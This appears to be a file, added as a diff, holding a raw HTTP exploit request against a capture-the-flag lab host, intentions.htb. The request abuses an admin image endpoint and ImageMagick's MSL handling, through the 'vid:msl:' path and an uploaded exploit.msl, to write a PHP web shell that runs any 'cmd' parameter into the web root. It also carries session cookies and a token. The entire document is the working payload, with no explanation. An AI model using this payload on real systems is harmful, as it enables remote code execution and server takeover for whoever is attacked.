@@ -1,0 +1,35 @@
+POST /api/v2/admin/image/modify HTTP/1.1
+Host: intentions.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=BOUNDARY
+X-XSRF-TOKEN: eyJpdiI6IkRGM2xCaThyb1F0TjNHZzB3TWkzNkE9PSIsInZhbHVlIjoiNXYwYjBBRlpsRVF5L1AzMlM4aHJabnN0V1lLYi96RUtaM0xnRHptU3FQMVpZTkgxaHYwUk55WUQzOUt6MGVVTlZqbGVwQWkxdG40K2UxT0oybFRVdlBjMU5oaVlteE5NR0pLRnVQN1Q1MHU1Rm5jN1dNejdwVGRsM1FnK3JUSnoiLCJtYWMiOiIxODlmYmM4NmY2MzdmMzMxZGNmMzYxMzM1ZjNlODA4NzMxZDcyMGQwMmM4MDI0NmY5ZjhhOGQ2NjZlYjEzY2ZkIiwidGFnIjoiIn0=
+Content-Length: 474
+Origin: http://intentions.htb
+Connection: close
+Referer: http://intentions.htb/admin
+Cookie: XSRF-TOKEN=eyJpdiI6IkRGM2xCaThyb1F0TjNHZzB3TWkzNkE9PSIsInZhbHVlIjoiNXYwYjBBRlpsRVF5L1AzMlM4aHJabnN0V1lLYi96RUtaM0xnRHptU3FQMVpZTkgxaHYwUk55WUQzOUt6MGVVTlZqbGVwQWkxdG40K2UxT0oybFRVdlBjMU5oaVlteE5NR0pLRnVQN1Q1MHU1Rm5jN1dNejdwVGRsM1FnK3JUSnoiLCJtYWMiOiIxODlmYmM4NmY2MzdmMzMxZGNmMzYxMzM1ZjNlODA4NzMxZDcyMGQwMmM4MDI0NmY5ZjhhOGQ2NjZlYjEzY2ZkIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImFBMU5FY1BGREZ4cDNRTEYwMlJZY0E9PSIsInZhbHVlIjoiTHBicHRIVWJXU2tYbmxLUEJucUd4RTZzU0RsbnI0RWJzbWQ0TXN3UzhpS0JwbjUwRU9sUk9HbFBadS9JaEhlbkdLM0JISGZVa2FFZ3NHUWdpbDNYYjFsNHpCU3VkUXA3dUFTQ3B6VHp0ekVhQ05Zek9OVE94a0x1M2hXQWNJNUMiLCJtYWMiOiI4N2Q1YjQ4NTBhZGE5ZmUzZDBkYWMwNzU0ODBmY2Q0NTA3ZTQ4NzllMzZlODZiZmVhYzA0ZDgzYmE4YWY1NDcwIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTA5OTMwODAsImV4cCI6MTY5MTAxNDY4MCwibmJmIjoxNjkwOTkzMDgwLCJqdGkiOiJhN2RyZVFKRlNIb0VhaTlyIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.us4YgKJnnAQzoW_bwgkuETiC2jc1JTRLGOFNLAu6VJY
+
+--BOUNDARY
+Content-Disposition: form-data; name="path"
+
+vid:msl:/tmp/php*
+
+--BOUNDARY
+Content-Disposition: form-data; name="effect"
+
+sepia
+
+--BOUNDARY
+Content-Disposition: form-data; name="exploit"; filename="exploit.msl"
+Content-Type: text/plain
+
+<?xml version="1.0" encoding="UTF-8"?>
+<image>
+<read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />
+<write filename="info:/var/www/html/intentions/public/ender.php" />
+</image>
+--BOUNDARY--
